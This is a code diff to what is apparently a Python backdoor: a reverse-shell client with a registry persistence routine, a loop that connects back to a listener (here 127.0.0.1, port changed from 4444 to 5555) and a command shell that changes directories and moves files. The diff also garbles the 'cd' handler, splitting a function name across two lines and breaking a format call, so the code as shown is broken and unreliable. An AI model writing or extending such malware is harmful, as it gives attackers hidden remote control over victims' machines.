@@ -14,10 +14,14 @@ import pyaudio
 import pyautogui
 import termcolor
 
+LHOST = "127.0.0.1";
+PORT = 5555
+
 
 def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
+
 
 def reliable_recv():
     data = ''
@@ -115,11 +119,9 @@ def persist(reg_name, copy_name):
 
 def connection():
     while True:
-        RHOST = "127.0.0.1"
-        RPORT = 4444
         time.sleep(20)
         try:
-            s.connect((RHOST, RPORT))
+            s.connect((LHOST, PORT))
             shell()
             s.close()
             break
@@ -139,9 +141,10 @@ def shell():
         elif cmd[:3] == 'cd ':
             try:
                 os.chdir(cmd[3:])
-                reliable_send(termcolor.colored("[+] Changed directory to {}".format(os.getcwd()), 'green'))
+                r
             except FileNotFoundError:
-                pass
+                eliable_send(termcolor.colored("[-] Error: There is no dile called {}".cmd[3:], 'green'))
+
         elif cmd[:6] == 'upload':
             try:
                 download_file(cmd[7:])
